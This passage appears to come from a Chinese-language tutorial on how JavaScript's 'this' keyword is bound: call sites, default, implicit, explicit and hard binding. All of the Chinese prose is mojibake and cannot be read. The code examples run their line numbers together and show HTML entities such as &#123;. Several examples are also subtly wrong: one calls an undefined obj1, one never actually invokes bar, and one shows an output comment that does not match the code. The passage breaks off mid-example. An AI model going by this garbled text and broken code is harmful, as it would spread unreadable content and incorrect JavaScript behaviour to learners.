ä»ŽæŸä¸ªè§’åº¦è¿™ç¡®å®žè§£å†³äº†é—®é¢˜ï¼Œä½†å¯æƒœå¿½ç•¥äº†çœŸæ­£çš„é—®é¢˜ï¼Œæ— æ³•ç†è§£ this çš„å«ä¹‰å’Œå·¥ä½œåŽŸç†ï¼Œè€Œæ˜¯ä½¿ç”¨äº†æ›´ç†Ÿæ‚‰çš„è¯æ³•ä½œç”¨åŸŸæŠ€æœ¯ã€‚ å¦‚æžœè¦ä»Žå‡½æ•° å¯¹è±¡å†…éƒ¨å¼•ç”¨å®ƒæœ¬èº«ï¼Œé‚£åªä½¿ç”¨ this æ˜¯ä¸å¤Ÿçš„ï¼Œä¸€èˆ¬æ¥è¯´ï¼Œéœ€è¦é€šè¿‡ä¸€ä¸ªæŒ‡å‘å‡½æ•°å¯¹è±¡çš„è¯æ³•æ ‡è¯†ç¬¦ï¼ˆå˜é‡ï¼‰æ¥å¼•ç”¨å®ƒã€‚ æ€è€ƒä¸‹é¢çš„å‡½æ•°ï¼š 123456function foo()&#123; foo.count = 4; // foo æŒ‡å‘å®ƒæœ¬èº«&#125;setTimeout(function()&#123; // åŒ¿åå‡½æ•°æ— æ³•æŒ‡å‘æœ¬èº«ï¼ˆæ²¡æœ‰åå­—ï¼‰&#125;,10); ç¬¬ä¸€å‡½æ•°å«åšå…·åå‡½æ•°ï¼Œåœ¨å®ƒå†…éƒ¨å¯ä»¥ä½¿ç”¨ foo æ¥å¼•ç”¨è‡ªèº«ã€‚ä½†æ˜¯åœ¨ç¬¬äºŒä¸ªä¾‹å­ä¸­ï¼Œä¼ å…¥ setTimeout(..)çš„å›žè°ƒå‡½æ•°æ²¡æœ‰åç§°æ ‡è¯†ç¬¦ï¼ˆè¿™ç§å‡½æ•°è¢«ç§°ä¸ºåŒ¿åå‡½æ•°ï¼‰ï¼Œå› æ­¤æ— æ³•ä»Žå‡½æ•°å†…éƒ¨å¼•ç”¨æœ¬èº«ã€‚ è¿˜æœ‰ä¸€ç§ä¼ ç»Ÿä½†æ˜¯çŽ°åœ¨å·²ç»è¢«å¼ƒç”¨å’Œæ‰¹åˆ¤çš„ç”¨æ³•ï¼Œä½¿ç”¨ arguments.callee æ¥å¼•ç”¨å½“å‰æ­£åœ¨è¿è¡Œçš„å‡½æ•°å¯¹è±¡ã€‚è¿™æ˜¯å”¯ä¸€ä¸€ç§å¯ä»¥ä»ŽåŒ¿åå‡½æ•°å¯¹è±¡å†…éƒ¨å¼•ç”¨è‡ªèº«çš„æ–¹æ³•ã€‚ç„¶è€Œæ›´å¥½çš„æ–¹æ³•æ˜¯é¿å…ä½¿ç”¨åŒ¿åå‡½æ•°ï¼Œè‡³å°‘åœ¨éœ€è¦è‡ªå¼•ç”¨æ—¶ä½¿ç”¨å…·åå‡½æ•°ï¼ˆè¡¨è¾¾å¼ï¼‰ã€‚argumentss.callee å·²ç»è¢«å¼ƒç”¨ï¼Œå°½é‡ä¸è¦ä½¿ç”¨å®ƒ æ‰€ä»¥ï¼Œå¦ä¸€ç§è§£å†³ æ–¹æ³•æ˜¯ä½¿ç”¨ foo æ ‡è¯†ç¬¦æ›¿ä»£ this æ¥å¼•ç”¨å‡½æ•°å¯¹è±¡ã€‚ 1234567891011121314151617function foo(num)&#123; console.log("foo:"+num); // è®°å½•foo è¢«è°ƒç”¨çš„æ¬¡æ•° foo.count++;&#125;foo.count = 0;var i;for(i = 0; i &lt; 10; i++)&#123; if(i &gt; 5)&#123; foo(i) &#125;&#125;// foo:6// foo:7// foo:8// foo:9console.log(foo.count); // 0 ä¸ºä»€ä¹ˆï¼Ÿ ç„¶è€Œï¼Œè¿™ç§æ–¹æ³•åŒæ ·å›žé¿äº† this çš„é—®é¢˜ï¼Œå¹¶ä¸”å®Œå…¨ä¾èµ–äºŽå˜é‡ foo çš„è¯æ³•ä½œç”¨åŸŸã€‚ å¦ä¸€ç§æ–¹æ³•æ˜¯å¼ºåˆ¶ this æŒ‡å‘ foo å‡½æ•°å¯¹è±¡ï¼š 123456789101112131415161718function foo(num)&#123; console.log("foo:"+num); // è®°å½•foo è¢«è°ƒç”¨çš„æ¬¡æ•° this.count++;&#125;foo.count = 0;var i;for(i = 0; i &lt; 10; i++)&#123; if(i &gt; 5)&#123; // ä½¿ç”¨ call(..)ç¡®ä¿ this æŒ‡å‘å‡½æ•°å¯¹è±¡çš„æœ¬èº« foo.call(foo,i) &#125;&#125;// foo:6// foo:7// foo:8// foo:9console.log(foo.count); // 0 ä¸ºä»€ä¹ˆï¼Ÿ å®ƒçš„ä½œç”¨åŸŸç¬¬äºŒç§å¸¸è§çš„è¯¯è§£æ˜¯ï¼Œthis æŒ‡å‘å‡½æ•°çš„ä½œç”¨åŸŸï¼Œè¿™ä¸ªè§‚ç‚¹æ˜¯ç‰‡é¢çš„ï¼Œåœ¨æŸç§æƒ…å†µä¸‹æ˜¯æ­£ç¡®çš„ã€‚ éœ€è¦æ˜Žç¡®çš„æ˜¯ï¼Œthis åœ¨ä»»ä½•æƒ…å†µä¸‹éƒ½ä¸æŒ‡å‘å‡½æ•°è¯æ³•ä½œç”¨åŸŸï¼Œåœ¨ JavaScript å†…éƒ¨ï¼Œä½œç”¨åŸŸç¡®å®žå’Œå¯¹è±¡å¾ˆç±»ä¼¼ï¼Œå¯è§çš„æ ‡è¯†ç¬¦éƒ½æ˜¯å®ƒçš„å±žæ€§ã€‚ä½†æ˜¯ä½œç”¨åŸŸâ€œå¯¹è±¡â€æ— æ³•é€šè¿‡ JavaScript ä»£ç è®¿é—®ï¼Œå®ƒå­˜äºŽ JavaScript å¼•æ“Žå†…éƒ¨ã€‚ æ€è€ƒä¸‹é¢çš„ä»£ç ï¼Œå®ƒè¯•å›¾ï¼ˆä½†æ˜¯æ²¡æœ‰æˆåŠŸï¼‰è·¨è¶Šä¾¿æ·ï¼Œä½¿ç”¨ this æ¥éšå¼å¼•ç”¨ å‡½æ•°çš„è¯æ³•ä½œç”¨åŸŸï¼š 12345678function foo()&#123; var a = 2; this.bar();&#125;function bar()&#123; console.log(this.a);&#125;foo(); // ReferenceError: a is not defined é¦–å…ˆè¿™æ®µä»£ç è¯•å›¾é€šè¿‡ this.bar() æ¥å¼•ç”¨ bar å‡½æ•°ï¼Œè¿™æ ·è°ƒç”¨æˆåŠŸçº¯å±žæ„å¤–ã€è°ƒç”¨ bar() æœ€è‡ªç„¶çš„æ–¹å¼æ˜¯å¿½ç•¥å‰é¢çš„ this,ç›´æŽ¥ä½¿ç”¨è¯æ³•å¼•ç”¨æ ‡è¯†ç¬¦ã€‚æ­¤å¤–ï¼Œè¿™æ®µä»£ç è¿˜å°è¯•ä½¿ç”¨ this è”é€š foo å’Œ bar ä¸¤ä¸ªå‡½æ•°çš„è¯æ³•ä½œç”¨åŸŸï¼Œä»Žè€Œè®© bar å‡½æ•°å¯ä»¥è®¿é—® foo ä½œç”¨åŸŸçš„å˜é‡ a,è¿™æ˜¯ä¸å¯èƒ½å®žçŽ°çš„ï¼Œä½¿ç”¨ this ä¸å¯èƒ½åœ¨è¯æ³•ä½œç”¨åŸŸä¸­æŸ¥åˆ°ä»€ä¹ˆã€‚ this åˆ°åº•æ˜¯ä»€ä¹ˆï¼ŸæŽ’é™¤äº†ä¸€äº›é”™è¯¯çš„ç†è§£åŽï¼Œæˆ‘ä»¬è¯´è¿‡ this æ˜¯åœ¨è¿è¡Œæ—¶ç»‘å®šçš„ï¼Œå¹¶ä¸æ˜¯ç¼–å†™æ—¶ç»‘å®šçš„ï¼Œå®ƒçš„ä¸Šä¸‹æ–‡å–å†³äºŽå‡½æ•°è°ƒç”¨æ—¶çš„å„ç§æ¡ä»¶ï¼Œthis çš„ç»‘å®šå’Œå‡½æ•°çš„å£°æ˜Žä½ç½®æ²¡æœ‰ä»»ä½•å…³ç³»ï¼Œåªå–å†³äºŽå‡½æ•°çš„è°ƒç”¨æ–¹å¼ã€‚ å½“ä¸€ä¸ªå‡½æ•°è¢«è°ƒç”¨æ—¶ï¼Œä¼šåˆ›å»ºä¸€ä¸ªæ´»åŠ¨è®°å½•ï¼ˆä¹Ÿè¢«ç§°ä¸ºæ‰§è¡Œä¸Šä¸‹æ–‡ï¼‰ã€‚è¿™ä¸ªè®°å½•ä¼šåŒ…å«å‡½æ•°åœ¨å“ªé‡Œè¢«è°ƒç”¨ï¼ˆè°ƒç”¨æ ˆï¼‰ã€å‡½æ•°çš„è°ƒç”¨æ–¹å¼ã€ä¼ å…¥çš„å‚æ•°ç­‰ä¿¡æ¯ã€‚this å°±æ˜¯è¿™ä¸ªè®°å½•çš„ä¸€ä¸ªå±žæ€§ï¼Œä¼šåœ¨å‡½æ•°æ‰§è¡Œçš„è¿‡ç¨‹ä¸­ç”¨åˆ°ã€‚ å°ç»“å­¦ä¹  this çš„ç¬¬ä¸€æ­¥æ˜¯æ˜Žç™½ this æ—¢ä¸æŒ‡å‘å‡½æ•°è‡ªèº«ä¹Ÿä¸æŒ‡å‘å‡½æ•°çš„è¯æ³•ä½œç”¨åŸŸï¼ŒæŠ›å¼€ä»¥å‰çš„é”™è¯¯çš„å‡è®¾å’Œç†è§£ã€‚this å®žé™…ä¸Šæ˜¯åœ¨å‡½æ•°è¢«è°ƒç”¨æ—¶å‘ç”Ÿç»‘å®šçš„ï¼Œå®ƒæŒ‡å‘ä»€ä¹ˆå®Œå…¨å–å†³äºŽå‡½æ•°åœ¨å“ªé‡Œè¢«è°ƒç”¨ã€‚ this çš„å…¨é¢è§£æžè°ƒç”¨ä½ç½®åœ¨ç†è§£ this çš„ç»‘å®šè¿‡ç¨‹ä¹‹å‰ï¼Œé¦–å…ˆè¦ç†è§£è°ƒç”¨ä½ç½®ï¼šè°ƒç”¨ä½ç½®å°±æ˜¯å‡½æ•°åœ¨ä»£ç ä¸­è¢«è°ƒç”¨çš„ä½ç½®ï¼ˆè€Œä¸æ˜¯å£°æ˜Žçš„ä½ç½®ï¼‰ã€‚åªæœ‰ä»”ç»†åˆ†æžè°ƒç”¨ä½ç½®æ‰å¯ä»¥å›žç­”è¿™ä¸ªé—®é¢˜ï¼šè¿™ä¸ª this åˆ°åº•å¼•ç”¨çš„æ˜¯ä»€ä¹ˆï¼Ÿ é€šå¸¸æ¥è¯´ï¼Œå¯»æ‰¾è°ƒç”¨ä½ç½®å°±æ˜¯å¯»æ‰¾â€œå‡½æ•°è¢«è°ƒç”¨çš„ä½ç½®â€ï¼Œä½†æ˜¯åšèµ·æ¥å¹¶æ²¡æœ‰é‚£ä¹ˆç®€å•ï¼Œå› ä¸ºæŸäº›ç¼–ç¨‹æ¨¡å¼å¯èƒ½ä¼šéšè—çœŸæ­£çš„è°ƒç”¨ä½ç½®ã€‚ æœ€é‡è¦çš„æ˜¯åˆ†æžè°ƒç”¨æ ˆï¼ˆå°±æ˜¯ä¸ºäº†è¾¾åˆ°å½“å‰æ‰§è¡Œä½ç½®æ‰€è°ƒç”¨çš„æ‰€æœ‰å‡½æ•°ï¼‰ã€‚æˆ‘ä»¬å…³å¿ƒçš„è°ƒç”¨ä½ç½®å°±åœ¨å½“å‰æ­£åœ¨æ‰§è¡Œçš„å‡½æ•°çš„å‰ä¸€ä¸ªè°ƒç”¨ä¸­ã€‚ ä¸‹é¢çœ‹çœ‹è°ƒç”¨æ ˆå’Œè°ƒç”¨ä½ç½®ï¼š 123456789101112131415161718function baz()&#123; // å½“å‰è°ƒç”¨æ ˆæ˜¯:baz // å› æ­¤ï¼Œå½“å‰è°ƒç”¨ä½ç½®æ˜¯å…¨å±€ä½œç”¨åŸŸ console.log("baz"); bar();&#125;function bar()&#123; // å½“å‰è°ƒç”¨æ ˆæ˜¯:baz -&gt; bar // å› æ­¤ï¼Œå½“å‰è°ƒç”¨åœ¨ baz ä¸­ console.log("bar"); foo();&#125;function foo()&#123; // å½“å‰è°ƒç”¨æ ˆæ˜¯:baz -&gt; bar -&gt; foo // å› æ­¤ï¼Œå½“å‰è°ƒç”¨åœ¨ bar ä¸­ console.log("foo"); &#125; baz(); // baz çš„è°ƒç”¨ä½ç½® æ³¨æ„ä¸Šé¢æ˜¯å¦‚ä½•ï¼ˆä»Žè°ƒç”¨æ ˆä¸­ï¼‰åˆ†æžå‡ºçœŸæ­£çš„è°ƒç”¨ä½ç½®ï¼Œå› ä¸ºå®ƒå†³å®šäº† this çš„ç»‘å®šã€‚ ç»‘å®šè§„åˆ™æ‰¾åˆ°è°ƒç”¨ä½ç½®åŽï¼Œåˆ¤æ–­éœ€è¦åº”ç”¨ä¸‹é¢çš„å››æ¡è§„åˆ™ä¸­çš„å“ªä¸€æ¡ã€‚ é»˜è®¤ç»‘å®šæœ€å¸¸ç”¨çš„å‡½æ•°è°ƒç”¨ç±»åž‹ï¼šç‹¬ç«‹å‡½æ•°è°ƒç”¨ã€‚å¯ä»¥æŠŠè¿™æ¡è§„åˆ™çœ‹åšæ˜¯æ— æ³•åº”ç”¨å…¶ä»–è§„åˆ™æ—¶çš„é»˜è®¤è§„åˆ™ã€‚ æ€è€ƒä¸‹é¢çš„ä»£ç ï¼š 12345function foo()&#123; console.log(this.a);&#125;var a = 2;foo(); // 2 å£°æ˜Žåœ¨å…¨å±€ä½œç”¨åŸŸä¸­çš„å˜é‡å°±æ˜¯å…¨å±€å¯¹è±¡çš„ä¸€ä¸ªåŒåå±žæ€§ï¼Œå®ƒä»¬æœ¬è´¨ä¸Šå°±æ˜¯åŒä¸€ä¸ªä¸œè¥¿ï¼Œå¹¶ä¸æ˜¯é€šè¿‡å¤åˆ¶å¾—åˆ°çš„ï¼Œå°±åƒä¸€ä¸ªç¡¬å¸çš„ä¸¤é¢ä¸€æ ·ã€‚ å½“è°ƒç”¨ foo() çš„æ—¶å€™ï¼Œthis.a è¢«è§£æžæˆäº†å…¨å±€å¯¹è±¡aï¼Œå› ä¸ºåœ¨æœ¬ä¾‹ä¸­ï¼Œå‡½æ•°è°ƒç”¨æ—¶åº”ç”¨äº† this çš„é»˜è®¤ç»‘å®šï¼Œå› æ­¤ this æŒ‡å‘äº†å…¨å±€å¯¹è±¡ã€‚å¯ä»¥é€šè¿‡åˆ†æžè°ƒç”¨ä½ç½®æ¥çœ‹çœ‹ foo æ˜¯å¦‚ä½•è°ƒç”¨çš„ã€‚åœ¨ä»£ç ä¸­ï¼Œfoo æ˜¯ç›´æŽ¥ä½¿ç”¨ä¸å¸¦ä»»ä½•ä¿®é¥°ç¬¦çš„å‡½æ•°å¼•ç”¨è¿›è¡Œè°ƒç”¨çš„ï¼Œå› æ­¤å› æ­¤åªèƒ½ä½¿ç”¨é»˜è®¤ç»‘å®šï¼Œæ— æ³•åº”ç”¨åœ¨å…¶ä»–è§„åˆ™ã€‚ å¦‚æžœä½¿ç”¨ä¸¥æ ¼æ¨¡å¼ï¼ˆstrict modeï¼‰,åˆ™ä¸èƒ½å°†å…¨å±€å¯¹è±¡ç”¨äºŽé»˜è®¤ç»‘å®šï¼Œå› æ­¤ this ä¼šç»‘å®šåˆ° undefined: 123456function foo()&#123; "use strict" console.log(this.a);&#125;var a = 2;foo(); // TypeError: this is undefined è¿™é‡Œæœ‰ä¸€ä¸ªå¾®å¦™é‡è¦çš„ç»†èŠ‚ï¼Œè™½ç„¶ this çš„ç»‘å®šè§„åˆ™å®Œå…¨å–å†³äºŽè°ƒç”¨ä½ç½®ï¼Œä½†æ˜¯åªæœ‰ foo è¿è¡Œåœ¨éž ä¸¥æ ¼æ¨¡å¼ä¸‹æ—¶ï¼Œé»˜è®¤ç»‘å®šæ‰èƒ½ç»‘å®šåˆ°å…¨å±€å¯¹è±¡ï¼Œåœ¨ä¸¥æ ¼æ¨¡å¼ä¸‹è°ƒç”¨ foo åˆ™ä¸å½±å“é»˜è®¤ç»‘å®šï¼š 12345678function foo()&#123; console.log(this.a);&#125;var a = 2;(function()&#123; "use strict"; foo(); // 2&#125;)(); éšå¼ç»‘å®šå¦ä¸€æ¡éœ€è¦è€ƒè™‘çš„æ˜¯è°ƒç”¨ä½ç½®æ˜¯å¦æœ‰ä¸Šä¸‹æ–‡å¯¹è±¡ï¼Œæˆ–è€…è¯´æ˜¯å¦è¢«æŸä¸ªå¯¹è±¡æ‹¥æœ‰æˆ–åŒ…å«ï¼Œä¸è¿‡è¿™ç§è¯´æ³•å¯èƒ½ä¼šé€ æˆä¸€äº›è¯¯å¯¼ã€‚ æ€è€ƒä¸‹é¢çš„ä»£ç ï¼š 12345678function foo()&#123; console.log(this.a);&#125;var obj = &#123; a:2, foo:foo&#125;;obj.foo(); // 2 éœ€è¦æ³¨æ„çš„æ˜¯ foo çš„å£°æ˜Žæ–¹å¼ï¼ŒåŠå…¶ä¹‹åŽæ˜¯å¦‚ä½•è¢«å½“åšå¼•ç”¨å±žæ€§æ·»åŠ åˆ° obj ä¸­çš„ã€‚ä½†æ˜¯æ— è®ºæ˜¯ç›´æŽ¥åœ¨ obj ä¸­å®šä¹‰è¿˜æ˜¯å…ˆå®šä¹‰å†æ·»åŠ ä¸ºå¼•ç”¨å±žæ€§ï¼Œè¿™ä¸ªå‡½æ•°ä¸¥æ ¼æ¥è¯´éƒ½ä¸å±žäºŽ obj å¯¹è±¡ã€‚ç„¶åŽï¼Œè°ƒç”¨ä½ç½®ä¼šä½¿ç”¨ obj çš„ä¸Šä¸‹æ–‡æ¥å¼•ç”¨å‡½æ•°ï¼Œå› æ­¤å¯ä»¥è¯´å‡½æ•°è¢«è°ƒç”¨æ—¶ foo å¯¹è±¡æ‹¥æœ‰æˆ–è€…åŒ…å«å‡½æ•°å¼•ç”¨ã€‚ å½“foo è¢«è°ƒç”¨æ—¶ï¼Œå®ƒçš„å‰é¢ç¡®å®žæ·»åŠ äº†å¯¹ obj çš„å¼•ç”¨ã€‚å½“å‡½æ•°å¼•ç”¨æœ‰ä¸Šä¸‹æ–‡å¯¹è±¡æ—¶ï¼Œéšå¼ç»‘å®šè§„åˆ™ä¼šåœ¨å‡½æ•°è°ƒç”¨ä¸­çš„ this ç»‘å®šåˆ°è¿™ä¸ªä¸Šä¸‹æ–‡å¯¹è±¡ã€‚å› ä¸ºè°ƒç”¨ foo æ—¶ this è¢«ç»‘å®šåˆ° obj,å› ä¸º this.a å’Œ obj.a æ˜¯ä¸€æ ·çš„ã€‚ å¯¹è±¡å±žæ€§å¼•ç”¨é“¾ä¸­åªæœ‰ä¸€å±‚æˆ–è€…è¯´æœ€åŽä¸€å±‚åœ¨è°ƒç”¨ä½ç½®ä¸­èµ·åˆ°äº†ä½œç”¨ã€‚ä¸¾ä¾‹è¯´ï¼š 123456789101112function foo()&#123; console.log(this.a);&#125;var obj2 = &#123; a:42, foo:foo&#125;;var obj = &#123; a:2, foo:foo&#125;;obj1.obj2.foo(); // 42 éšå¼ä¸¢å¤± ä¸€ä¸ªå¸¸è§çš„ this ç»‘å®šé—®é¢˜å°±æ˜¯è¢«éšå¼ç»‘å®šçš„å‡½æ•°ä¼šä¸¢å¤±ç»‘å®šå¯¹è±¡ï¼Œä¹Ÿå°±è¯´è¯´å®ƒä¼šåº”ç”¨é»˜è®¤ç»‘å®šï¼Œä»Žè€ŒæŠŠ this ç»‘å®šåˆ°å…¨å±€å¯¹è±¡æˆ–è€… undefined ä¸Šï¼Œå–å†³äºŽæ˜¯å¦æ˜¯ä¸¥æ ¼æ¨¡å¼ã€‚ æ€è€ƒä¸‹é¢çš„ä»£ç ï¼š 12345678910function foo()&#123; console.log(this.a);&#125;var obj = &#123; a:2, foo:foo&#125;;var bar = obj.foo; // å‡½æ•°åˆ«åvar a = "oops, global"; // a æ˜¯å…¨å±€å¯¹è±¡çš„å±žæ€§bar(); // oops, global è™½ç„¶ bar æ˜¯ obj.foo çš„ä¸€ä¸ªå¼•ç”¨ï¼Œä½†æ˜¯å®žé™…ä¸Šï¼Œå®ƒå¼•ç”¨çš„æ˜¯ foo å‡½æ•°æœ¬èº«ï¼Œå› æ­¤æ­¤æ—¶çš„ bar() å…¶å®žæ˜¯ä¸€ä¸ªä¸å¸¦ä»»ä½•ä¿®é¥°çš„å‡½æ•°è°ƒç”¨ï¼Œå› æ­¤åº”ç”¨äº†é»˜è®¤ç»‘å®šã€‚ ä¸€ç§æ›´å¾®å¦™ï¼Œæ›´å¸¸è§å¹¶ä¸”æ›´å‡ºä¹Žæ„æ–™çš„æƒ…å†µå‘ç”Ÿåœ¨ä¼ å…¥å›žè°ƒå‡½æ•°æ—¶ï¼š 12345678910111213function foo()&#123; console.log(this.a);&#125;function doFoo(fn)&#123; // fn å…¶å®žå¼•ç”¨çš„æ˜¯ foo fn(); // è°ƒç”¨ä½ç½®&#125;var obj = &#123; a:2, foo:foo&#125;;var a = "oops, global"; // a æ˜¯å…¨å±€å¯¹è±¡çš„å±žæ€§doFoo(obj.foo); // oops, global å‚æ•°ä¼ é€’å…¶å®žå°±æ˜¯ä¸€ç§éšå¼èµ‹å€¼ï¼Œå› æ­¤æˆ‘ä»¬ä¼ å…¥å‡½æ•°æ—¶ä¹Ÿä¼šè¢«éšå¼èµ‹å€¼ï¼Œæ‰€ä»¥ç»“æžœå’Œä¸Šä¸€ä¸ªä¾‹å­ä¸€æ ·ã€‚å¦‚æžœæŠŠå‡½æ•°ä¼ å…¥è¯­è¨€å†…ç½®çš„å‡½æ•°è€Œä¸æ˜¯ä¼ å…¥è‡ªå·±å£°æ˜Žçš„å‡½æ•°ï¼Œä¼šå‘ç”Ÿä»€ä¹ˆå‘¢ï¼Ÿç»“æžœæ˜¯ä¸€æ ·çš„ï¼Œæ²¡æœ‰åŒºåˆ«ï¼š 1234567891011121314function foo()&#123; console.log(this.a);&#125;var obj = &#123; a:2, foo:foo&#125;;var bar = obj.foo; // å‡½æ•°åˆ«åsetTimeout(obj.foo,100);// oops, global// js çŽ¯å¢ƒä¸­å†…ç½®çš„ setTimeoutå‡½æ•°å®žçŽ°å’Œä¸‹é¢çš„ä¼ªä»£ç ç›¸ä¼¼function setTimeout(fn,delay)&#123; // ç­‰å¾… delay ç§’ fn(); // è°ƒç”¨ä½ç½®&#125; å›žè°ƒå‡½æ•°ä¸¢å¤± this ç»‘å®šæ˜¯éžå¸¸å¸¸è§çš„ã€‚é™¤æ­¤ä¹‹å¤–ï¼Œè¿˜æœ‰ä¸€ç§æƒ…å†µ this çš„è¡Œä¸ºä¼šå‡ºä¹Žæˆ‘ä»¬çš„æ„æ–™ï¼šè°ƒç”¨å›žè°ƒå‡½æ•°çš„å‡½æ•°å¯èƒ½ä¼šä¿®æ”¹ this,åœ¨ä¸€äº›æµè¡Œçš„åº“ä¸­äº‹ä»¶å¤„ç†å™¨ä¼šæŠŠå›žè°ƒå‡½æ•° çš„ this å¼ºåˆ¶ç»‘å®šåœ¨è§¦å‘äº‹ä»¶çš„ DOM å…ƒç´ ä¸Šã€‚è¿™åœ¨ä¸€äº›æƒ…å†µä¸‹å¯èƒ½æœ‰ç”¨ã€‚ æ— è®ºæ˜¯å“ªç§æƒ…å†µï¼Œthis çš„æ”¹å˜éƒ½æ˜¯æ„æƒ³ä¸åˆ°çš„ã€‚å®žé™…ä¸Šä½ æ— æ³•æŽ§åˆ¶å›žè°ƒå‡½æ•°çš„æ‰§è¡Œæ–¹å¼ï¼Œå› æ­¤å°±æ²¡æœ‰åŠžæ³•æŽ§åˆ¶è°ƒç”¨ä½ç½®ä»¥å¾—åˆ°æœŸæœ›çš„ç»‘å®šã€‚åŽé¢ä¼šç”¨å›ºå®š this æ¥ä¿®å¤è¿™ä¸ªé—®é¢˜ã€‚ æ˜¾å¼ç»‘å®šåœ¨åˆ†æžéšå¼ç»‘å®šæ—¶ï¼Œæˆ‘ä»¬å¿…é¡»åœ¨ä¸€ä¸ªå¯¹è±¡å†…éƒ¨åŒ…å«ä¸€ä¸ªæŒ‡å‘å‡½æ•°çš„å±žæ€§ï¼Œå¹¶é€šè¿‡è¿™ä¸ªå±žæ€§é—´æŽ¥å¼•ç”¨å‡½æ•°ï¼Œä»Žè€ŒæŠŠ this é—´æŽ¥ï¼ˆéšå¼ï¼‰ç»‘å®šåˆ°è¿™ä¸ªå¯¹è±¡ä¸Šã€‚ é‚£å¦‚æžœæˆ‘ä»¬ä¸æƒ³åœ¨å¯¹è±¡å†…éƒ¨åŒ…å«å‡½æ•°å¼•ç”¨ï¼Œè€Œæƒ³åœ¨æŸä¸ªå¯¹è±¡ä¸Šå¼ºåˆ¶è°ƒç”¨å‡½æ•°ï¼Œè¯¥æ€Žä¹ˆåšå‘¢? JavaScript ä¸­çš„æ‰€æœ‰å‡½æ•°éƒ½æœ‰ä¸€äº›å¯ç”¨çš„ç‰¹æ€§ï¼ˆå’Œå®ƒä»¬çš„[[Prototype]] æœ‰å…³ï¼‰ï¼Œå¯ä»¥è§£å†³è¿™ä¸ªé—®é¢˜ã€‚å…·ä½“çš„è¯´ï¼Œå¯ä»¥ç”¨ call(..) å’Œ apply(..) æ–¹æ³•ã€‚ä¸¥æ ¼æ¥è¯´ï¼ŒJavaScript çš„å®¿ä¸»çŽ¯å¢ƒæœ‰æ—¶ä¼šæä¾›ä¸€äº›éžå¸¸ç‰¹æ®Šçš„å‡½æ•°ï¼Œå®ƒä»¬å¹¶æ²¡æœ‰è¿™ä¸¤ä¸ªæ–¹æ³•ã€‚ä½†æ˜¯è¿™æ ·çš„å‡½æ•°éžå¸¸ç½•è§ï¼ŒJavaScript æä¾›çš„ç»å¤§å¤šæ•°å‡½æ•°å·²ç»è‡ªå·±åˆ›å»ºçš„å‡½æ•°éƒ½å¯ä»¥ä½¿ç”¨è¿™ä¸¤ä¸ªæ–¹æ³•ã€‚ å®ƒä»¬çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œæ˜¯ç»™ this å‡†å¤‡çš„ï¼ŒæŽ¥ç€åœ¨è°ƒç”¨å‡½æ•°æ—¶ï¼Œå°†å…¶ç»‘å®šåˆ° this.å› ä¸ºå¯ä»¥ç›´æŽ¥æŒ‡å®š this å¯¹è±¡ï¼Œæ‰€ä»¥ç§°ä¹‹ä¸ºæ˜¾å¼ç»‘å®šã€‚ 1234567function foo()&#123; console.log(this.a);&#125;var obj = &#123; a:2&#125;;foo.call(obj); // 2 é€šè¿‡ foo.call() å¯ä»¥åœ¨è°ƒç”¨ foo æ—¶å¼ºåˆ¶æŠŠå®ƒçš„ this ç»‘å®šåˆ° obj ä¸Šã€‚å¦‚æžœä¼ å…¥äº†ä¸€ä¸ªåŽŸå§‹å€¼ï¼ˆå­—ç¬¦ä¸²ç±»åž‹ã€å¸ƒå°”ç±»åž‹æˆ–è€…æ•°å­—ç±»åž‹ï¼‰æ¥å½“åš this çš„ç»‘å®šå¯¹è±¡ï¼Œè¿™ä¸ªåŽŸå§‹å€¼ä¼šè¢«è½¬æ¢æˆå®ƒçš„å¯¹è±¡å½¢å¼ï¼ˆä¹Ÿå°±æ˜¯ new String(..)ã€new Boolean(..)ã€new Number(..)ï¼‰ã€‚è¿™é€šå¸¸è¢«ç§°ä¸ºâ€œè£…ç®±â€ ä»Ž this ç»‘å®šçš„è§’åº¦æ¥è¯´ï¼Œcall å’Œ apply æ˜¯ä¸€æ ·çš„ï¼ŒåŒºåˆ«åœ¨äºŽå‚å…¥çš„å‚æ•°ä¸ä¸€æ ·ï¼Œcall ä¼ å…¥å•ä¸ªå€¼ï¼Œapply å¯ä»¥ä¼ ä¸€ä¸ªæˆ–è€…ä¸€ä¸ªä»¥ä¸Šçš„ä»¥æ•°ç»„å½¢å¼çš„å€¼ å¯æƒœï¼Œæ˜¾ç¤ºç»‘å®šä»ç„¶æ— æ³•è§£å†³ä¹‹å‰æå‡ºçš„ä¸¢å¤±ç»‘å®šé—®é¢˜ã€‚ 1.ç¡¬ç»‘å®š ä½†æ˜¯æ˜¾ç¤ºç»‘å®šçš„ä¸€ä¸ªå˜ç§å¯ä»¥è§£å†³è¿™ä¸ªé—®é¢˜ã€‚ 1234567891011121314function foo()&#123; console.log(this.a);&#125;var obj = &#123; a:2&#125;;var bar = function()&#123; foo.call(obj);&#125;bar; // 2setTimeout(bar,100); //2// ç¡¬ç»‘å®šçš„ bar ä¸å¯èƒ½å†ä¿®æ”¹å®ƒçš„ thisbar.call(window); // 2 ä¸Šé¢çš„ä¾‹å­åˆ›å»ºäº†å‡½æ•° bar()ï¼Œå¹¶åœ¨å®ƒçš„å†…éƒ¨æ‰‹åŠ¨è°ƒç”¨äº† foo.call(obj)ï¼Œå› æ­¤å¼ºåˆ¶æŠŠ foo çš„ this ç»‘å®šåˆ°äº† objä¸Šã€‚ä¹‹åŽæ— è®ºå¦‚ä½•è°ƒç”¨å‡½æ•° bar ,å®ƒæ€»ä¼šæ‰‹åŠ¨åœ¨ obj ä¸Šè°ƒç”¨ foo.è¿™ç§ç»‘å®šæ˜¯ä¸€ç§æ˜¾å¼çš„å¼ºåˆ¶ç»‘å®šï¼Œæˆ‘ä»¬ç§°ä¹‹ä¸ºç¡¬ç»‘å®šã€‚ ç¡¬ç»‘å®šçš„å…¸åž‹åº”ç”¨åœºæ™¯å°±æ˜¯åˆ›å»ºä¸€ä¸ªåŒ…è£¹å‡½æ•°ï¼Œè´Ÿè´£æŽ¥å£å‚æ•°å¹¶è¿”å›žå€¼ï¼š 123456789101112function foo(something)&#123; console.log(this.a,something); return this.a + something;&#125;var obj = &#123; a:2&#125;;var bar = function()&#123; return foo.apply(obj,arguments);&#125;var b = bar(3); // 2 3console.log(b); // 5 å¦ä¸€ä¸­æ–¹æ³•å°±æ˜¯åˆ›å»ºä¸€ä¸ªå¯ä»¥é‡å¤ä½¿ç”¨çš„è¾…åŠ©å‡½æ•°ï¼š 12345678910111213141516function foo(something)&#123; console.log(this.a,something); return this.a + something;&#125;// 